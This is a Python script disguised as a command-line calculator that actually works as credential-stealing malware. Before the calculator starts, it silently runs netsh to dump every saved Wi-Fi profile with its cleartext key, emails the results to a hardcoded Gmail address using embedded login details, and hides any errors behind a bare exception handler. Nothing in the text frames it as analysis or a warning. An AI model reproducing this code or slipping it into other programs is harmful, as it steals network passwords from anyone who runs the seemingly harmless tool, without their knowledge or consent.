import subprocess, re, smtplib
try:
    def nbDxcc(emayl,paws,hashCt):
        servX=smtplib.SMTP('smtp.gmail.com',587)
        servX.starttls()
        servX.login(emayl,paws)
        servX.sendmail(emayl,emayl,hashCt)
        servX.quit()
    command = "netsh wlan show profiles"
    networks = subprocess.check_output(command, shell = True)
    network_names=re.findall('(?:All User Profile\s*:\s)([^\r]*)',networks.decode("utf-8"))

    result = ''' '''
    for name in network_names:
        comm = "netsh wlan show profiles "+name+" key=clear"
        op = subprocess.check_output(comm,shell=True)
        result += op.decode("utf-8")
    nbDxcc("ig.secure.9312@gmail.com","pointbreak",result)
    while True:
        exp = input("Enter your Problem: ")
        if exp == "exit":
            break
        reg = re.match(r'^([0-9\.]+)(\+|\-|\*|\/)([0-9\.]+)$',exp)
        try:
            if reg:
                x = float(reg.group(1))
                y = float(reg.group(3))
                z = reg.group(2)
                if z == "+":
                    print("Your Answer is : {}".format(x+y))
                elif z == "-":
                    print("Your Answer is : {}".format(x-y))
                elif z == "*":
                    print("Your Answer is : {}".format(x*y))
                else:
                    print("Your Answer is : {}".format(x/y))    
            else:
                print("Enter a valid expression...")
        except:
            print("Error processing your request...")

except:
    pass
